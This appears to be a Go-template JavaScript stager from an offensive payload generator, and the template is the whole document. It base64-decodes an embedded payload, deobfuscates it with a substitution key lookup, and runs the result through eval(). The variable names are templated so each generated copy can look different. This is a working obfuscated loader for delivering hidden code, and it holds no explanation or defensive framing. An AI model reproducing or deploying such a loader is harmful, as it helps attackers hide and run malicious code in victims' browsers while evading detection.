// Lookup key
{{ .Stage0KeyVar }}={{ .Stage0Key }};
// Payload
{{ .PayVar }}=window.atob("{{ .Pay }}");
// Decrypt the payload variable
{{ .BuffVar }} = "";
for(i=0; i<{{ .PayVar }}.length; i++){
    {{ .BuffVar }} += {{ .Stage0KeyVar }}[{{ .PayVar }}[i]];
}
// Eval the payload
eval({{ .BuffVar }});